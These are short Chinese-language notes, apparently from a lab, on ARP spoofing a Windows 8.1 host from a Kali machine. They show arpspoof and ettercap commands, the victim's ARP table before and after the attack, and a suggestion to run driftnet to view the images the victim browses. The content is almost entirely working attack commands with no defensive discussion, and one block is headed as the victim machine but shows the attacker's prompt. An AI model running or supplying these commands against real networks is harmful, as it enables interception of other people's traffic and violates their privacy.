## arpspoof & ettercap

### 攻击前

	攻击机：kali 172.16.8.182
		root@kali:~# arp
		Address                  HWtype  HWaddress           Flags Mask            Iface
		172.16.8.180             ether   12:24:36:48:60:72   C                     eth1
		172.16.0.1               ether   d4:3d:7e:f8:98:44   C                     eth1

	受害机：win8.1 172.16.8.180
		C:\Users\Michael.zou>arp -a

		接口: 172.16.8.180 --- 0x3
		  Internet 地址         物理地址              类型
		  172.16.0.1            d4-3d-7e-f8-98-44     动态
		  172.16.8.182          08-00-27-65-ee-95     动态

### ARP 攻击操作

	root@kali:~# echo 1 >> /proc/sys/net/ipv4/ip_forward
	root@kali:~# arpspoof -i eth1 -t 172.16.8.180 172.16.0.1
	root@kali:~# arpspoof -i eth1 -t 172.16.0.1 172.16.8.180
	
	或：
	root@kali:~# echo 1 >> /proc/sys/net/ipv4/ip_forward
	root@kali:~# arpspoof -i eth1 -c both -t 172.16.8.180 172.16.0.1
	
	或：
	root@kali:~# echo 1 >> /proc/sys/net/ipv4/ip_forward
	root@kali:~# ettercap -T -i eth1 -M arp:remote /172.16.0.1/ /172.16.8.180/
		  
### 攻击后

	受害机：win8.1 172.16.8.180
		C:\Users\Michael.zou>arp -a

		接口: 172.16.8.180 --- 0x3
		  Internet 地址         物理地址              类型
		  172.16.0.1            08-00-27-65-ee-95     动态
		  172.16.8.182          08-00-27-65-ee-95     动态

	受害机：win8.1 172.16.8.180
		root@kali:~# arp
		Address                  HWtype  HWaddress           Flags Mask            Iface
		172.16.8.180             ether   12:24:36:48:60:72   C                     eth1
		172.16.0.1               ether   d4:3d:7e:f8:98:44   C                     eth1
		
	此时可使用 driftnet -i eth1 查看受害机在网络中浏览的图片数据
